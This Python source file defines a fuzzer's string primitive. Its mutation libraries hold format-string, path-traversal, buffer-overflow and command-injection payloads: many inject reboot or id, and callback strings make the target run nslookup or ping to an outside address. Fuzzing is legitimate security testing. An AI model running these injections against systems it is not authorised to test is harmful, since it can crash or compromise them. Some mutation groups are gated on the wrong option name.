import random
import glob

from .base_primitive import BasePrimitive


class String(BasePrimitive):
    # store fuzz_library as a class variable to avoid copying the ~70MB structure across each instantiated primitive.
    _fuzz_library = []

    def __init__(self, value, size=-1, padding="\x00", encoding="utf-8", fuzzable=True, max_len=-1, name=None,
                 callback_addr=None, filename=None, mutations=('long', 'commands', 'format', 'misc')):
        """
        Primitive that cycles through a library of "bad" strings. The class variable 'fuzz_library' contains a list of
        smart fuzz values global across all instances. The 'this_library' variable contains fuzz values specific to
        the instantiated primitive. This allows us to avoid copying the near ~70MB fuzz_library data structure across
        each instantiated primitive.

        @type  value:    str or bytes
        @param value:    Default string value
        @type  size:     int
        @param size:     (Optional, def=-1) Static size of this field, leave -1 for dynamic.
        @type  padding:  chr
        @param padding:  (Optional, def="\\x00") Value to use as padding to fill static field size.
        @type  encoding: str
        @param encoding: (Optional, def="utf-8") String encoding, ex: utf_16_le for Microsoft Unicode.
        @type  fuzzable: bool
        @param fuzzable: (Optional, def=True) Enable/disable fuzzing of this primitive
        @type  max_len:  int
        @param max_len:  (Optional, def=-1) Maximum string length
        @type  name:     str
        @param name:     (Optional, def=None) Specifying a name gives you direct access to a primitive
        @type  callback_addr:     str
        @param callback_addr:     (Optional, def=None) Specifying a callback addr will inject ping and nslookup commands

        """

        super(String, self).__init__()

        if isinstance(value, bytes):
            self._original_value = value
        else:
            self._original_value = value.encode(encoding=encoding)
        self._value = self._original_value
        self.size = size
        self.max_len = max_len
        if self.size > -1:
            self.max_len = self.size
        self.padding = padding
        self.encoding = encoding
        self._fuzzable = fuzzable
        self._name = name
        self._filename = filename
        self._mutations = mutations
        self.this_library = []
        self.this_library.extend(
            [(self._value * i)[:65535] for i in (2, 10, 100, 500, 1000, 2000, 5000, 10000, 50000)])
        self.this_library.extend(
            [(self._value * i)[:65535] + b"\xfe" for i in (2, 10, 100, 500, 1000, 2000, 5000, 10000, 50000)])

        if self._filename is not None:  # If filename is present, only the file lines will be used for mutations
            self.set_filename(self._filename)

        if callback_addr:
            self.set_callback_commands(callback_addr)

        if not self._fuzz_library:
            self._fuzz_library = []

            if 'commands' in self._mutations:
                self._fuzz_library.extend([
                    "%n" * 100,
                    "%n" * 500,
                    "\"%n\"" * 500,
                    "%s" * 100,
                    "%s" * 500,
                    "\"%s\"" * 500
                ])

            if 'commands' in self._mutations:
                self._fuzz_library.extend([
                    "",
                    # strings ripped from spike (and some others I added)
                    "/.:/" + "A" * 5000 + "\x00\x00",
                    "/.../" + "B" * 5000 + "\x00\x00",
                    "/.../.../.../.../.../.../.../.../.../.../",
                    "/../../../../../../../../../../../../etc/passwd",
                    "/../../../../../../../../../../../../boot.ini",
                    "..:..:..:..:..:..:..:..:..:..:..:..:..:",
                    "\\\\*",
                    "\\\\?\\",
                    "/\\" * 5000,
                    "/." * 5000,
                    "!@#$%%^#$%#$@#$%$$@#$%^^**(()",
                    "%01%02%03%04%0a%0d%0aADSF",
                    "%01%02%03@%04%0a%0d%0aADSF",
                    "\x01\x02\x03\x04",
                    "/%00/",
                    "%00/",
                    "%00",
                    "%u0000",
                    "%\xfe\xf0%\x00\xff",
                    "%\xfe\xf0%\x01\xff" * 20,

                    # some binary strings.
                    "\xde\xad\xbe\xef",
                    "\xde\xad\xbe\xef" * 10,
                    "\xde\xad\xbe\xef" * 100,
                    "\xde\xad\xbe\xef" * 1000,
                    "\xde\xad\xbe\xef" * 10000,

                    # miscellaneous.
                    "\r\n" * 100,
                    "<>" * 500  # sendmail crackaddr (http://lsd-pl.net/other/sendmail.txt)
                ])

            if 'commands' in self._mutations:
                self._fuzz_library.extend([
                    "|touch /tmp/fuzzowski",
                    ";touch /tmp/fuzzowski;",
                    "|notepad",
                    ";notepad;",
                    "\nnotepad\n",
                    "|reboot",
                    ";reboot;",
                    "\nreboot\n",

                    # fuzzdb command injection
                    "a)|reboot;",
                    "CMD=$'reboot';$CMD",
                    "a;reboot",
                    "a)|reboot",
                    "|reboot;",
                    "'reboot'",
                    "^CMD=$\"reboot\";$CMD",
                    "`reboot`",
                    "%0DCMD=$'reboot';$CMD",
                    "/index.html|reboot|",
                    "%0a reboot %0a",
                    "|reboot|",
                    "||reboot;",
                    ";reboot/n",
                    "id",
                    ";id",
                    "a;reboot|",
                    "&reboot&",
                    "%0Areboot",
                    "a);reboot",
                    "$;reboot",
                    "&CMD=$\"reboot\";$CMD",
                    "&&CMD=$\"reboot\";$CMD",
                    ";reboot",
                    "id;",
                    ";reboot;",
                    "&CMD=$'reboot';$CMD",
                    "& reboot &",
                    "; reboot",
                    "&&CMD=$'reboot';$CMD",
                    "reboot",
                    "^CMD=$'reboot';$CMD",
                    ";CMD=$'reboot';$CMD",
                    "|reboot",
                    "<reboot;",
                    "FAIL||reboot",
                    "a);reboot|",
                    "%0DCMD=$\"reboot\";$CMD",
                    "reboot|",
                    "%0Areboot%0A",
                    "a;reboot;",
                    "CMD=$\"reboot\";$CMD",
                    "&&reboot",
                    "||reboot|",
                    "&&reboot&&",
                    "^reboot",
                    ";|reboot|",
                    "|CMD=$'reboot';$CMD",
                    "|nid",
                    "&reboot",
                    "a|reboot",
                    "<reboot%0A",
                    "FAIL||CMD=$\"reboot\";$CMD",
                    "$(reboot)",
                    "<reboot%0D",
                    ";reboot|",
                    "id|",
                    "%0Dreboot",
                    "%0Areboot%0A",
                    "%0Dreboot%0D",
                    ";system('reboot')",
                    "|CMD=$\"reboot\";$CMD",
                    ";CMD=$\"reboot\";$CMD",
                    "<reboot",
                    "a);reboot;",
                    "& reboot",
                    "| reboot",
                    "FAIL||CMD=$'reboot';$CMD",
                    "<!--#exec cmd=\"reboot\"-->",
                    "reboot;",
                ])

            if 'long' in self._mutations:
                self._add_long_strings("C")
                self._add_long_strings("1")
                self._add_long_strings("<")
                self._add_long_strings(">")
                self._add_long_strings("'")
                self._add_long_strings("\"")
                self._add_long_strings("/")
                self._add_long_strings("\\")
                self._add_long_strings("?")
                self._add_long_strings("=")
                self._add_long_strings("a=")
                self._add_long_strings("&")
                self._add_long_strings(".")
                self._add_long_strings(",")
                self._add_long_strings("(")
                self._add_long_strings(")")
                self._add_long_strings("]")
                self._add_long_strings("[")
                self._add_long_strings("%")
                self._add_long_strings("*")
                self._add_long_strings("-")
                self._add_long_strings("+")
                self._add_long_strings("{")
                self._add_long_strings("}")
                self._add_long_strings("\x14")
                self._add_long_strings("\x00")
                self._add_long_strings("\xFE")  # expands to 4 characters under utf16
                self._add_long_strings("\xFF")  # expands to 4 characters under utf16

                # add some long strings with null bytes thrown in the middle of them.
                for length in [128, 256, 1024, 2048, 4096, 32767, 0xFFFF]:
                    s = "D" * length
                    # Number of null bytes to insert (random)
                    for i in range(random.randint(1, 10)):
                        # Location of random byte
                        loc = random.randint(1, len(s))
                        s = s[:loc] + "\x00" + s[loc:]
                    self._fuzz_library.append(s)


        # Remove any fuzz items greater than self.max_len
        if self.max_len > 0:
            if any(len(s) > self.max_len for s in self._fuzz_library):
                # Pull out the bad string(s):
                self._fuzz_library = list(set([s[:self.max_len] for s in self._fuzz_library]))

    @property
    def name(self):
        return self._name

    def set_filename(self, filename):
        self._filename = filename
        self._fuzz_library = []
        self.this_library = []
        list_of_files = glob.glob(filename)
        for fname in list_of_files:
            with open(fname, "r") as _file_handle:
                self._fuzz_library.extend([l.strip() for l in _file_handle.readlines() if len(l) > 1])

    def _add_long_strings(self, sequence):
        """
        Given a sequence, generate a number of selectively chosen strings lengths of the given sequence and add to the
        string heuristic library.

        @type  sequence: str
        @param sequence: Sequence to repeat for creation of fuzz strings.
        """
        strings = []
        for size in [128, 256, 512, 1024, 2048, 4096, 32768, 0xFFFF]:
            strings.append(sequence * (size - 2))
            strings.append(sequence * (size - 1))
            strings.append(sequence * size)
            strings.append(sequence * (size + 1))
            strings.append(sequence * (size + 2))

        for size in [5000, 10000, 20000, 99999, 100000, 500000, 1000000]:
            strings.append(sequence * size)

        for string in strings:
            self._fuzz_library.append(string)

    CALLBACK_PAYLOADS = [
        '/usr/bin/env nslookup %s;',
        ' | /usr/bin/env nslookup %s;',
        '\n/usr/bin/env nslookup %s;',
        ' || /usr/bin/env nslookup %s;',
        ' && /usr/bin/env nslookup %s;',
        ';/usr/bin/env nslookup %s #',
        ' &;/usr/bin/env nslookup %s #',
        '`/usr/bin/env nslookup %s`',
        '$(/usr/bin/env nslookup %s)',

        ' | nslookup %s',
        '$ | nslookup %s',
        '&& | nslookup %s',
        '$&&nslookup %s',
        '\n nslookup %s',
        ' | nslookup %s',
        '$ | nslookup %s',
        '&& | nslookup %s',
        '$&&nslookup %s',
        '\n nslookup %s',
        ' | nslookup %s',
        '$ | nslookup %s',
        '&& | nslookup %s',
        '$&&nslookup %s',
        '\n nslookup %s',
        ' nslookup %s |',
        ' | nslookup %s |',
        ' | nslookup %s |',
        'ping -c1 %s',
        '!--#exec cmd="/usr/bin/nslookup %s"-->',
        '<!--#exec cmd="nslookup %s"-->',
        '/index.html|nslookup %s|',
        ';nslookup %s;',
        ';nslookup %s',
        ';nslookup %s;',
        '|nslookup %s',
        '|/usr/bin/nslookup %s',
        '|nslookup %s|',
        '|/usr/bin/nslookup %s|',
        '||/usr/bin/nslookup %s|',
        '|nslookup %s;',
        '||/usr/bin/nslookup %s;',
        ';nslookup %s|',
        ';|/usr/bin/nslookup %s|',
        '\n/usr/bin/nslookup %s\n',
        '\nnslookup %s\n',
        '\n/usr/bin/nslookup %s;',
        '\nnslookup %s;',
        '\n/usr/bin/nslookup %s|',
        '\nnslookup %s|',
        ';/usr/bin/nslookup %s\n',
        ';nslookup %s\n',
        '|usr/bin/nslookup %s\n',
        '|nnslookup %s\n',
        '`nslookup %s`',
        '`/usr/bin/nslookup %s`',
        'a);nslookup %s',
        'a;nslookup %s',
        'a);nslookup %s;',
        'a;nslookup %s;',
        'a);nslookup %s|',
        'a;nslookup %s|',
        'a)|nslookup %s',
        'a|nslookup %s',
        'a)|nslookup %s;',
        'a|nslookup %s',
        '|nslookup %s',
        'a);/usr/bin/nslookup %s',
        'a;/usr/bin/nslookup %s',
        'a);/usr/bin/nslookup %s;',
        'a;/usr/bin/nslookup %s;',
        'a);/usr/bin/nslookup %s|',
        'a;/usr/bin/nslookup %s|',
        'a)|/usr/bin/nslookup %s',
        'a|/usr/bin/nslookup %s',
        'a)|/usr/bin/nslookup %s;',
        'a|/usr/bin/nslookup %s',
        ";system('nslookup %s')",
        ";system('nslookup %s')",
        ";system('/usr/bin/nslookup %s')",
        '\nnslookup %s',
        '\n/usr/bin/nslookup %s',
        '\nnslookup %s',
        '\n/usr/bin/nslookup %s\n',
        '\nnslookup %s\n',
        '& ping2 -c 30 %s &',
        '& ping2 -n 30 %s &',
        '\n ping2 -i 30 %s \n',
        '`ping2 %s`',
        '| nslookup %s',
        '& nslookup %s',
        '; nslookup %s',
        '\n nslookup %s \n',
        '`nslookup %s`',
        '$;/usr/bin/nslookup %s',
        # '"|curl "http://%s/'
        '%s',
    ]

    def set_callback_commands(self, callback_addr):
        self._fuzz_library = []
        self.this_library = []
        for cmd in self.CALLBACK_PAYLOADS:
            self._fuzz_library.append(str(self._original_value + bytes(cmd % callback_addr, 'utf-8'), 'utf-8'))

    def mutate(self):
        """
        Mutate the primitive by stepping through the fuzz library extended with the "this" library, return False on
        completion.

        @rtype:  bool
        @return: True on success, False otherwise.
        """

        # loop through the fuzz library until a suitable match is found.
        while 1:
            # if we've ran out of mutations, raise the completion flag.
            if self._mutant_index == self.num_mutations():
                self._fuzz_complete = True

            # if fuzzing was disabled or complete, and mutate() is called, ensure the original value is restored.
            if not self._fuzzable or self._fuzz_complete:
                self._value = self._original_value
                return False

            # update the current value from the fuzz library.
            self._value = (self.this_library + self._fuzz_library)[self._mutant_index]

            # increment the mutation count.
            self._mutant_index += 1

            # if the size parameter is disabled, done.
            if self.size == -1:
                return True

            # ignore library items greater then user-supplied length.
            # TODO: might want to make this smarter.
            if len(self._value) > self.size:
                continue
            else:
                return True

    def num_mutations(self):
        """
        Calculate and return the total number of mutations for this individual primitive.

        @rtype:  int
        @return: Number of mutated forms this primitive can take
        """
        return len(self._fuzz_library) + len(self.this_library)

    def _render(self, value):
        """Render string value, properly encoded.
        """
        # pad undersized library items.
        if len(value) < self.size:
            value += self.padding * (self.size - len(value))

        try:
            if isinstance(value, bytes):
                _rendered = value
            else:
                _rendered = value.encode(self.encoding)
        except UnicodeDecodeError:
            # If we can't decode the string, just treat it like a plain byte string
            _rendered = value

        return _rendered
